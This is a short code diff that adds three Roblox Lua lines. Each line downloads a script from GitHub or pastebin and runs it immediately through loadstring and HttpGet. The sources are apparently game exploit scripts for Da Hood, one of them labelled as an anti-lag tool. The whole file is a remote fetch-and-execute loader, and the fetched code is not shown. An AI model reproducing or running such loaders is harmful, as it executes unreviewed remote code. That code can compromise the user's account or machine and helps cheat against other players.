@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/anti-lag-v2-fps/main/Dhm",true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/script-da-hood-modded-by-me/main/Da%20hood%20morder%20v1",true))();
+spawn(loadstring(game:HttpGet("https://pastebin.com/raw/zKjj0TQD", true)))();
